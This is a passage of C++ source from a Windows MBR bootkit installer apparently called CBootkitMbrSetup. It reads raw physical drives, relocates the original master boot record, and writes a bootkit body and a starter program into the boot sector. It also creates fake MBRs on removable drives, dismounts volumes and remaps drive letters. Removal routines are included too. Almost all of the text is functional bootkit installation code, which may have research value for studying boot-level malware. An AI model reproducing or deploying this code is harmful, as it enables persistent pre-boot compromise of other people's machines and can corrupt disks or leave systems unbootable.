		// No disk geometry
		dwTotalDiskSect = dwLastPartSect;
		diskGeom.Geometry.BytesPerSector = 0x200;
	} else
		dwTotalDiskSect = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);

	// Define how to install Bootkit
	if (dwFirstPartSect >= 0x14) 
		// Install in Hard Disk starting area
		dwNewOrgMbrSect = 0x12;
	 
	else if ((dwLastPartSect + 0x8) < dwTotalDiskSect) 
		// Install in Hard Disk ending area
		dwNewOrgMbrSect = dwLastPartSect + 0x06;
	
	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  0b. Search original Windows Mbr program
	BYTE IsStdSect = 0; dwWinMbrSect = (DWORD)-1;
	if (!bRemovable)
		IsStdSect = this->InternalSearchStandardMbr(hDrive, &dwWinMbrSect);
	else
		IsStdSect = IsStandardMbr(g_dwSysBootDskIdx, &dwWinMbrSect);

	// Analyze IsStdSect value and implement "Ignore standard Mbr Search" option here
	if (g_bDontAnalyzeMbr) {
		if (IsStdSect != 0x01) 
			g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Ignoring standard Windows MBR search due to user explicit requested."); 
		dwWinMbrSect = 0;		// Ignore it
	}
	else {
		if (IsStdSect != 0x01) 
			g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Warning! Found NON-StandardMbr on \"%s\".", devName);

		if (IsStdSect < 0 || dwWinMbrSect == (DWORD)-1) {
			// Unable to determine standard mbr sector number
			if (!bRemovable) {
				g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Warning! Unable to find Original Windows Mbr on \"%s\"."
					L"This could lead to unpredictable results. I will stop installation procedure; to ignore this message you can "
					L"change Setup option \"Ignore system MBR type analysis\" from Setup application.", devName);
				// Exit
				CloseHandle(hDrive);
				return false;
			} else {
				g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Warning! Unable to find Original Windows Mbr on \"%s\"."
					L"This could lead to unpredictable results. I will ignore this because I am doing a removable installation...", devName);
				dwWinMbrSect = 0;		// Ignore it
			}
		}
	}
	// |---------------------------------------------------------------------------------------------------------------------------------------|

	// 1. Write original Mbr in new sector
	LARGE_INTEGER diskOffset = {0};
	diskOffset.QuadPart = (LONGLONG)dwNewOrgMbrSect * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, diskOffset, NULL, FILE_BEGIN);  
	if (retVal)
		retVal = WriteFile(hDrive, (LPVOID)&mbr, sizeof(mbr),  &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to write original Mbr in sector 0x%08X. Last error: %i.",
			(LPVOID)dwNewOrgMbrSect, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	} else
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Successfully written original Mbr in sector 0x%08X.", (LPVOID)dwNewOrgMbrSect);
	// |---------------------------------------------------------------------------------------------------------------------------------------|


	// 2. Write bootkit program
	if (btkType == BOOTKIT_TYPE_STANDARD)
		dwBtkProgramSize = CPeResource::SizeOfRes(MAKEINTRESOURCE(IDR_BINMAIN), L"BINARY");
	else
		dwBtkProgramSize = CPeResource::SizeOfRes(MAKEINTRESOURCE(IDR_BINMAINNS), L"BINARY");

	dwBootkitBodySect = dwNewOrgMbrSect - ((dwBtkProgramSize + 0x1F0) / diskGeom.Geometry.BytesPerSector);
	retVal = WriteBtkProgram(hDrive, (QWORD)dwBootkitBodySect, btkType, diskGeom.Geometry.BytesPerSector);
	if (!retVal) { CloseHandle(hDrive); return false; }

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  3. Finally write new Bootkit Starter program
	RtlCopyMemory(&bootkitMbr, &mbr, sizeof(MASTER_BOOT_RECORD));
	lpCurRes = CPeResource::Extract(MAKEINTRESOURCE(IDR_BINSTARTER), L"BINARY", &dwResSize);
	lastErr = GetLastError();

	if (!lpCurRes || !dwResSize) {
		// Resource extraction error
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to extract bootkit starter program from myself. Last Error: %i", (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	}
	RtlCopyMemory(bootkitMbr.MBP, lpCurRes, MBPSIZE);

	// Compile starter program
	PBOOTKIT_STARTER pBtkStarter = (PBOOTKIT_STARTER)&bootkitMbr;
	pBtkStarter->dwBtkStartSector = dwBootkitBodySect;
	if (bRemovable) {
		// Removable device installation, read original MBR from main hard disk
		pBtkStarter->dwOrgMbrSector = 0;
		pBtkStarter->dwRemDevOrgMbrSector = dwNewOrgMbrSect;
		pBtkStarter->dwWinStdMbrSector = dwWinMbrSect;
		pBtkStarter->uchBootDrive = bootDiskIdx;
		pBtkStarter->wBtkProgramSize = (WORD)((dwBtkProgramSize + 0x1F0) / diskGeom.Geometry.BytesPerSector);
	} else {
		// Fixed device installation type, read original MBR from its new location
		pBtkStarter->dwOrgMbrSector = dwNewOrgMbrSect;
		pBtkStarter->dwRemDevOrgMbrSector = 0;
		pBtkStarter->dwWinStdMbrSector = dwWinMbrSect;
		pBtkStarter->uchBootDrive = bootDiskIdx;
		pBtkStarter->wBtkProgramSize = (WORD)((dwBtkProgramSize + 0x1F0) / diskGeom.Geometry.BytesPerSector);
	}

	// Write it
	retVal = SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);  
	if (retVal != INVALID_SET_FILE_POINTER) retVal = TRUE;
	if (retVal)
		retVal = WriteFile(hDrive, (LPVOID)&bootkitMbr, sizeof(MASTER_BOOT_RECORD), &dwBytesRead, NULL);
	lastErr = GetLastError();
	CloseHandle(hDrive);

	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to write new bootkit Master Boot Record. Last error: %i.", (LPVOID)lastErr);
		return false;
	} else
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Successfully written new bootkit Master Boot Record.");

	return true;
}

// Remove a MBR bootkit from a particular Drive
bool CBootkitMbrSetup::MbrRemoveBootkit(DWORD drvNum, BOOLEAN bRemovable) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string

	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	
	return DevMbrRemoveBootkit(hdName, bRemovable);
}

// Remove Memory bootkit from a particular Device
bool CBootkitMbrSetup::DevMbrRemoveBootkit(LPTSTR devName, BOOLEAN bRemovable) {
	// IOCTL_STORAGE_GET_MEDIA_TYPES get if device is removable or not
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD btkMbr = {0};				// Read Master Boot Sector
	MASTER_BOOT_RECORD orgMbr = {0};
	DISK_GEOMETRY_EX diskGeom = {0};				// drvNum Disk Geometry
	DWORD dwBytesRead = 0;							// Total number of bytes read
	BOOTKIT_STARTER * pbtkStarter = NULL;			// Bootkit starter sector
	BOOTKIT_PROGRAM * pbtkPrg = NULL;				// Main bootkit program code
	LPBYTE lpBuff = NULL;							// Generic buffer
	DWORD buffSize = 4096;							// Buffer size
	LARGE_INTEGER offset = {0};						// Generic offset

	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return false;
	}

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  0. Read System Mbr and analyze it
	retVal = ReadFile(hDrive, (LPVOID)&btkMbr, sizeof(btkMbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Unable to read bootkit Mbr from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	}

	pbtkStarter = (BOOTKIT_STARTER*)btkMbr.MBP;
	if (strncmp(pbtkStarter->signature, "AaLl86", 6) != 0 ||
		!pbtkStarter->dwBtkStartSector) { 
		// No Bootkit starter program found
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - System MBR on \"%s\" is not x86 Memory bootkit code.", (LPVOID)devName);
		CloseHandle(hDrive);
		return false;
	}

	// Get disk Geometry to obtain sector size
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) 
		// No disk geometry
		diskGeom.Geometry.BytesPerSector = 0x200;

	// Read, check and replace Mbr
	LARGE_INTEGER orgMbrOffset = {0};
	if (bRemovable && pbtkStarter->dwRemDevOrgMbrSector) 
		// Removable devices, use original Removable Device MBR Sector
		orgMbrOffset.LowPart = pbtkStarter->dwRemDevOrgMbrSector;
	else
		// Fixed device
		orgMbrOffset.LowPart = pbtkStarter->dwOrgMbrSector;
	orgMbrOffset.QuadPart *= diskGeom.Geometry.BytesPerSector;

	retVal = SetFilePointerEx(hDrive, orgMbrOffset, NULL, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&orgMbr, sizeof(orgMbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal || orgMbr.signature != 0xAA55) {
		// Error while reading Disk
		if (!retVal)
			g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Unable to read original Mbr from sector 0x%08x of \"%s\". Last Error: %i",
			(LPVOID)(orgMbrOffset.QuadPart / diskGeom.Geometry.BytesPerSector), (LPVOID)devName, (LPVOID)lastErr);
		else
			g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Error, sector 0x%08x is not original system Mbr!", 
			(LPVOID) (orgMbrOffset.QuadPart / diskGeom.Geometry.BytesPerSector));
		CloseHandle(hDrive);
		return false;
	}
	
	// Copy original Mbr in its real location
	offset.QuadPart = 0;
	retVal = SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
	RtlCopyMemory(&orgMbr.PTable, &btkMbr.PTable, sizeof(orgMbr.PTable));
	orgMbr.signature = 0xAA55;
	if (retVal)
		retVal = WriteFile(hDrive, (LPVOID)&orgMbr, sizeof(orgMbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Unable to write original Mbr on \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	} else
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Successfully restored original Mbr on \"%s\".", (LPVOID)devName);


	// Delete original Mbr bootkit location
	retVal = SetFilePointerEx(hDrive, orgMbrOffset, NULL, FILE_BEGIN);
	if (retVal) {
		buffSize = diskGeom.Geometry.BytesPerSector;
		lpBuff = new BYTE[buffSize];
		RtlZeroMemory(lpBuff, buffSize);
		RtlCopyMemory(lpBuff + FIELD_OFFSET(MASTER_BOOT_RECORD, PTable), &orgMbr.PTable, 
			sizeof(MASTER_BOOT_RECORD) - FIELD_OFFSET(MASTER_BOOT_RECORD, PTable));
		retVal = WriteFile(hDrive, (LPVOID)lpBuff, buffSize, &dwBytesRead, NULL);
		delete[] lpBuff;
	}
	lastErr = GetLastError();
	if (!retVal)
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Unable to zero out old Mbr sector 0x%08x on \"%s\". Last Error: %i",
			(LPVOID) (orgMbrOffset.QuadPart / diskGeom.Geometry.BytesPerSector), (LPVOID)devName, (LPVOID)lastErr);

	// Get bootkit code 
	offset.QuadPart = (LONGLONG)pbtkStarter->dwBtkStartSector * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, offset, NULL,FILE_BEGIN);
	if (retVal) {
		// Get size of bootkit
		buffSize = pbtkStarter->wBtkProgramSize * diskGeom.Geometry.BytesPerSector;
		//if (!CPeResource::Extract(MAKEINTRESOURCE(IDR_BINSEVEN), L"BINARY", &buffSize))
		//	buffSize = diskGeom.Geometry.BytesPerSector;
		lpBuff = new BYTE[buffSize];
		retVal = ReadFile(hDrive, (LPVOID)lpBuff, buffSize, &dwBytesRead, NULL);
		pbtkPrg = (BOOTKIT_PROGRAM*)lpBuff;
		
		if (retVal) 
			if (strncmp(pbtkPrg->signature, "AaLl86", 6) == 0) {
				retVal = SetFilePointerEx(hDrive, offset, NULL,FILE_BEGIN);
				RtlZeroMemory(lpBuff, buffSize);
				retVal = WriteFile(hDrive, (LPVOID)lpBuff, buffSize, &dwBytesRead, NULL);
			} else
				SetLastError(ERROR_INVALID_IMAGE_HASH);
	}
	lastErr = GetLastError();
	
	if (retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Successfully deleted bootkit sectors (start from: 0x%08X) on \"%s\".", 
			(LPVOID) (offset.QuadPart / diskGeom.Geometry.BytesPerSector), (LPVOID)devName);
	} else {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrRemoveBootkit - Warning! Unable to delete bootkit sectors (start from: 0x%08X) on \"%s\"."
			L" Last error %i.",	(LPVOID) (offset.QuadPart / diskGeom.Geometry.BytesPerSector), (LPVOID)devName, (LPVOID)lastErr);
	}

	CloseHandle(hDrive);
	return true;
}
#pragma endregion

#pragma region Removable Volumes Install & Remove Functions (see "Readme.txt" file for details)
// Install Memory bootkit in a removable volume
bool CBootkitMbrSetup::VolInstallBootkit(LPTSTR volName, bool bEraseOnErr) {
	DWORD diskNum = 0;									// Volume physical disk number
	TCHAR realDosDevName[0x100] = {0};					// Real dos device name
	TCHAR ntVolName[0x80] = {0};						// Nt full Volume name
	DISK_TYPE dskType = DISK_TYPE_UNKNOWN;				// Disk device filesystem type
	DISK_GEOMETRY_EX diskGeom = {0};					// Drive disk geometry
	DWORD buffSize = 0;									// Buffer size
	LPBYTE zeroBuff = NULL;								// Zeroed buffer
	bool bDeleteDosName = false;						// TRUE if I have to delete DOS device name
	BYTE remDevBiosIdx = 0x81;							// Removable device emulation BIOS index
	BOOL retVal = false;
	DWORD lastErr = 0;
	if (!volName || !wcschr(volName, L':')) return false;
	UNREFERENCED_PARAMETER(bEraseOnErr);

	// Obtain Volume Nt Device name
	retVal = QueryDosDevice(wcschr(volName, L':') - 1, ntVolName, COUNTOF(ntVolName));
	lastErr = GetLastError();
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Unable to query \"%s\" Nt Volume Device Name."
			L" QueryDosDevice last Error: %i", volName, (LPVOID)lastErr);
		return false;
	}

	diskNum = GetPhysDiskOfVolume(volName, false);
	if (diskNum == (DWORD)-1) {
		TCHAR volDosName[4] = {0, L':', L'\\', 0};
		volDosName[0] = (wcschr(volName, L':') - 1)[0];
		retVal = GetVolumeNameForVolumeMountPoint(volDosName, realDosDevName, COUNTOF(realDosDevName));

		if (!retVal) {
			//Dos devices doesn't exist, don't delete drive letter and restore real DOS Dev Name
			wcscpy_s(realDosDevName, COUNTOF(realDosDevName), L"\\\\.\\A:");
			if (volName[0] == L'\\') wcscpy_s(realDosDevName, COUNTOF(realDosDevName), volName);
			else realDosDevName[4] = volName[0];
		} else {
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Detected real removable device \"%s\". Volume GUID: \"%s\".",
				volDosName, realDosDevName);
			// Trim down last slash
			buffSize = wcslen(realDosDevName);
			if (realDosDevName[buffSize -1] == '\\') 
				realDosDevName[buffSize -1] = 0;
		}
		// If I am here removable device is a Floppy/Zip drive. I shouldn't remove drive letter
		bDeleteDosName = false;
		remDevBiosIdx = 0x80;				// 0x80 Index = First Hard disk drive
	} else {
		TCHAR drvNumStr[0x4] = {0};						// Drive number string
		wcscpy_s(realDosDevName, COUNTOF(realDosDevName), L"\\\\.\\PhysicalDrive\0\0");
		_itow(diskNum, drvNumStr, 10);
		wcscat_s(realDosDevName, COUNTOF(realDosDevName), drvNumStr);
		bDeleteDosName = true;
		remDevBiosIdx = 0x81;				// 0x81 Index = Second Hard disk drive
	}

	g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Starting installation of Bootkit on \"%s\" drive... "
		L"Delete DOS Name: %s, System first fixed Disk Device Bios Index: 0x%02X.", 
		(LPVOID)realDosDevName, bDeleteDosName ? L"TRUE" : L"FALSE", (LPVOID)remDevBiosIdx);

	// Get Disk Filesystem type
	dskType = GetDiskDevType(realDosDevName);
	
	if (dskType >= DISK_TYPE_GUID)  {
		// Dismount only if I'm operating with a FS formatted PENDRIVE
		retVal = DismountVolume(volName, bDeleteDosName);
		lastErr = GetLastError();
		if (retVal) 
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Successfully unmounted \"%.2s\" Volume!",
				wcschr(volName, L':') - 1);
		else
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Warning! Unable to unmounted \"%.2s\" Volume!",
			L" Last error: %i.", wcschr(volName, L':') - 1, (LPVOID)lastErr);
	}
	else
		bDeleteDosName = false;

	if (dskType != DISK_TYPE_MBR) {
		// Create fake MBR, write in device and start MBR Installation procedure
		LPBYTE resBuff = NULL;					// Resource buffer
		DWORD dwResSize = 0;					// Reosurce size
		BYTE fakeMbr[0x200] = {0};				// Fake MBR buffer
		PMASTER_BOOT_RECORD pMbr = NULL;		// Fake MBR structure pointer
		HANDLE hDrive = NULL;					// Physical Drive handle
		DWORD dwBytesRead = 0;					// Number of bytes read/written

		resBuff = CPeResource::Extract(MAKEINTRESOURCE(IDR_BINORG), L"BINARY", &dwResSize);
		lastErr = GetLastError();
		if (!resBuff) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Unable to extract original Windows Seven Mbr resource from myself."
				L" Last Error: %i", (LPVOID)lastErr);
			return false;
		}

		RtlCopyMemory(fakeMbr, resBuff, sizeof(fakeMbr));
		pMbr = (PMASTER_BOOT_RECORD)fakeMbr;

		// Generate random disk ID
		srand(GetTickCount());
		pMbr->dwDiskId = rand() + (rand() << 16);

		// Open physical device
		hDrive = CreateFile(realDosDevName, GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_WRITE | FILE_SHARE_READ, 
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		lastErr = GetLastError();
		if (hDrive == INVALID_HANDLE_VALUE) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Unable to open \"%s\" for writing...", (LPVOID)realDosDevName);
			return false;
		}

		// Get disk Geometry to obtain sector size
		retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, 
			sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
		lastErr = GetLastError();
		if (!retVal) {
			// No disk geometry
			diskGeom.Geometry.BytesPerSector = 0x200;
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Warning! No disk geometry for \"%s\"..."
				L" Last Error: %i", (LPVOID)realDosDevName, (LPVOID)lastErr);
			diskGeom.Geometry.BytesPerSector = 0x200;						//Default values
			diskGeom.DiskSize.QuadPart = 0xFFFFFFFF * diskGeom.Geometry.BytesPerSector;
		}
		diskGeom.DiskSize.QuadPart /= diskGeom.Geometry.BytesPerSector;

		// Generate a fake partition table
		PARTITION_ELEMENT * pElem = &pMbr->PTable.Partition[0];
		pElem->FileSystemType = 0x25;			// Unknown
		pElem->FreeSectorsBefore = 0x80;
		pElem->TotalSectors = diskGeom.DiskSize.LowPart - 0x80;

		// Write this fake Mbr
		SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);
		retVal = WriteFile(hDrive, (LPVOID)pMbr, sizeof(MASTER_BOOT_RECORD), &dwBytesRead, NULL);
		lastErr = GetLastError();

		if (!retVal) {
			// Error while reading Disk
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Error! Unable to write fake Mbr to \"%s\" device. Last Error: %i",
				(LPVOID)realDosDevName, (LPVOID)lastErr);
			CloseHandle(hDrive);
			return false;
		} else {
			// Zero out 16 sectors
			buffSize = diskGeom.Geometry.BytesPerSector * 16;
			zeroBuff = (LPBYTE)(VirtualAlloc(NULL, buffSize, MEM_COMMIT, PAGE_READWRITE));
			RtlZeroMemory(zeroBuff, buffSize);		
			WriteFile(hDrive, zeroBuff, buffSize, &dwBytesRead, NULL);
		}
		CloseHandle(hDrive);				// We no longer need it
	}

	// Do Actual installation
	// Get suggested bootktit type for this system
	BOOTKIT_TYPE btkType;
	if (g_btkType == BOOTKIT_TYPE_UNKNOWN_OR_AUTO) {
		btkType = GetBootkitTypeForSystem();
		if (btkType != BOOTKIT_TYPE_STANDARD)
		g_pLog->WriteLine(L"INFO: VolInstallBootkit has detected a NON-Standard memory bootkit for this machine...");
	} else
		btkType = g_btkType;
	
	retVal = DevMbrInstallBootkit(realDosDevName, btkType, TRUE, remDevBiosIdx);

	if (bDeleteDosName) {
		/*			CREATE PERMANENT Symbolic Link Procedure
		UNICODE_STRING targetNameString = {0};
		OBJECT_ATTRIBUTES oa = {0};
		UNICODE_STRING linkNameString = {0};
		NTSTATUS ntStatus = 0;
		HANDLE hLink = NULL;

		wcscpy_s(realDosDevName, COUNTOF(realDosDevName), L"\\??\\");
		volName = wcschr(volName, L':');
		if (volName) volName--;
		wcsncat_s(realDosDevName, COUNTOF(realDosDevName), volName, 2);

		// Intialize Unicode strings
		RtlInitUnicodeString(&linkNameString, realDosDevName);
		RtlInitUnicodeString(&targetNameString, ntVolName);
		InitializeObjectAttributes(&oa, &linkNameString, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
		
		// Create Link
		ntStatus = ZwCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &targetNameString);
		if (ntStatus == 0)
			CloseHandle(hLink);
		*/
		TCHAR dosName[0x8] = {0};
		BOOL retVal2 = FALSE;
		volName = wcschr(volName, L':');
		if (volName) volName--;
		dosName[0] = volName[0];
		dosName[1] = L':';		dosName[2] = 0;

		// Recreate Removable device
		retVal2 = DefineDosDevice(DDD_RAW_TARGET_PATH, dosName, ntVolName);
		lastErr = GetLastError();
		if (retVal2) 
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Successfully remapped \"%s\" drive letter!", volName);
		else
			g_pLog->WriteLine(L"CBootkitMbrSetup::VolInstallBootkit - Warning! Unable to remap \"%s\" drive letter!"
				L" Last Error: %i", (LPVOID)volName, (LPVOID)lastErr);
	}
	return (retVal != FALSE);
}

// Remove Memory bootkit from a removable volume
bool CBootkitMbrSetup::VolRemoveBootkit(LPTSTR volName) {
	DWORD diskNum = 0;
	UINT volType = 0;
	bool retVal = false;

	diskNum = GetPhysDiskOfVolume(volName);
	TCHAR volDosName[4] = {0};
	volDosName[1] = L':'; volDosName[2] = L'\\';
	LPTSTR colonPtr = wcschr(volName, L':');
	if (colonPtr) {
		volDosName[0] = (wcschr(volName, L':') - 1)[0];
		volType = GetDriveType(volDosName);
	}

	if (diskNum == (DWORD)-1) 
		// Use this volume name as Device
		retVal = DevMbrRemoveBootkit(volName, (volType & DRIVE_REMOVABLE));
	else
		retVal = MbrRemoveBootkit(diskNum, (volType & DRIVE_REMOVABLE));
	return retVal;
}
#pragma endregion

#pragma region Volume I/O Utility functions
// Remove device letter of a particular volume
bool CBootkitMbrSetup::RemoveDeviceLetter(LPTSTR volName) {
	if (!volName) return false;
	LPTSTR pNtDeviceName = NULL;		
	int nRetVal = 0;

	if (volName[0] == L'\\') {
		LPTSTR tmpStr = wcschr(volName, L':');
		if (tmpStr && tmpStr != volName) volName = tmpStr - 1;
	}
    
	// First, get the name of the Windows NT device from the symbolic link, then delete the symbolic link.
	pNtDeviceName = new TCHAR[MAX_PATH];	
	nRetVal = QueryDosDevice (volName, pNtDeviceName, MAX_PATH);
	if (nRetVal)      
		nRetVal = DefineDosDevice (DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE,
			volName, pNtDeviceName);
	
	delete[] pNtDeviceName;
	return (nRetVal != FALSE);
}

// Disomunt a particular volume
bool CBootkitMbrSetup::DismountVolume(LPTSTR volName, bool bRemoveLetter) {
	HANDLE hVol = NULL;						// Volume file object handle
	BOOL retVal = FALSE;					// Returned value
	DWORD dwBytesRet = 0;					// Number of bytes returned
	DWORD lastErr = 0;						// Last Win32 error
	TCHAR realDosVolName[0x20] = {0};
	if (!volName || !wcschr(volName, L':')) return false;

	wcscpy_s(realDosVolName, COUNTOF(realDosVolName), L"\\\\.\\A:");
	if (volName[0] == L'\\') wcscpy_s(realDosVolName, COUNTOF(realDosVolName), volName);
	else realDosVolName[4] = volName[0];

	hVol = CreateFile(realDosVolName, GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_NO_BUFFERING, NULL);
	
	if (hVol == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::DismountVolume - Unable to open \"%s\" for dismounting... Last Error: %i", 
			volName, (LPVOID)lastErr);
		return false;
	}

	if (bRemoveLetter) {
		retVal = RemoveDeviceLetter(volName);

		lastErr = GetLastError();
		if (!retVal) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::DismountVolume - Unable to remove %0.2s device letter. Last Error: %i", 
				wcschr(volName, L':') - 1, (LPVOID)lastErr);
			CloseHandle(hVol);
			return false;
		}
	}

	// Lock volume to ensure that nobody else will write to it
	DeviceIoControl(hVol, FSCTL_LOCK_VOLUME, NULL,	0, NULL, 0,	&dwBytesRet, NULL);
	
	// Syncronously flush file system cache before attempting dismount
	// to ensure the dismount doesn't need to schedule a  flush.
	FlushFileBuffers(hVol);

	// Performing Ioctl dismount the volume
	retVal = DeviceIoControl(hVol, FSCTL_DISMOUNT_VOLUME, NULL,	0, NULL, 0, &dwBytesRet, NULL);
	if (!retVal) 
		g_pLog->WriteLine(L"CBootkitMbrSetup::DismountVolume - Unable to dismount \"%s\" volume. DeviceIoControl last Error: %i", 
			volName, (LPVOID)lastErr);

	// Unlock locked volume
	DeviceIoControl(hVol, FSCTL_UNLOCK_VOLUME, NULL,	0, NULL, 0,	&dwBytesRet, NULL);
	CloseHandle(hVol);
	
	return (retVal != FALSE);
}
#pragma endregion

#pragma region Bootmgr Management functions
// Get virtual volume number of Bootmgr
DWORD CBootkitMbrSetup::GetBootmgrVolume(LPTSTR volName, DWORD dwNameCCh) {
	TCHAR volPath[0x100] = {0};					// Volume path string
	DWORD volNameLen = 0;						// Volume name current len
	DWORD volNumber = (DWORD)-1;
	HANDLE hBootmgr = NULL;						// Bootmgr file handle
	HANDLE hSearch = NULL;						// Volume search handle
	BOOL retVal = 0;							// Win32 API returned value
	DWORD lastErr = 0;							// Last Win32 Error
	LPBYTE buff = NULL;							// Buffer 			
	DWORD buffSize = 8192;						// Buffer size
	DWORD bytesRead = 0;						// Number of bootmgr bytes read
	BOOL isValid = FALSE;						// TRUE if I found a valid Bootmgr
	VOLUME_DISK_EXTENTS vde = {0};				// Current volume disk extents
	LPTSTR slashPtr = NULL;

	hSearch = FindFirstVolume(volPath, COUNTOF(volPath));
	volNameLen = wcslen(volPath);
	lastErr = GetLastError();

	if (volNameLen && volPath[volNameLen-1] != L'\\') {
		// Add trailing slash
		volPath[volNameLen++] = L'\\';
		volPath[volNameLen] = 0;
	}
	wcscat_s(volPath, COUNTOF(volPath), L"bootmgr");
	buff = (LPBYTE)VirtualAlloc(NULL, buffSize, MEM_COMMIT, PAGE_READWRITE);
	if (!buff) return (DWORD)-1;
	if (hSearch !=  INVALID_HANDLE_VALUE) retVal = TRUE;

	while (retVal) {
		HANDLE hVol = NULL;							// target Volume handle
		UINT drvType = 0;							// target Drive type
		DWORD dskIdx = (DWORD)-1;					// target Volume disk index
		hBootmgr = CreateFile(volPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		lastErr = GetLastError();
		if (hBootmgr != INVALID_HANDLE_VALUE) {
			// Read file and get if BOOTMGR is valid
			//DWORD fileSize = GetFileSize(hBootmgr, NULL);
			SetFilePointer(hBootmgr, 0x2000, NULL, FILE_BEGIN);
			
			do {
				retVal = ReadFile(hBootmgr, (LPVOID)buff, buffSize, &bytesRead, NULL);
				if (!retVal) break;
				for (DWORD i = 0; i < bytesRead; i++) 
					if (strnicmp((LPSTR)&buff[i], "bootmgr", 7) == 0) {
						isValid = TRUE;
						break;
					}
				
				if (isValid) break;

				// Scroll back file pointer by 8 bytes
				if (bytesRead >= buffSize)
					SetFilePointer(hBootmgr, -(0x08), NULL, FILE_CURRENT);
				
			} while (retVal && bytesRead);

			// Close file handle 
			CloseHandle(hBootmgr);

			// Open target volume and get disk extents
			if (volNameLen && volPath[volNameLen-1] == L'\\') 
				volPath[--volNameLen] = 0;
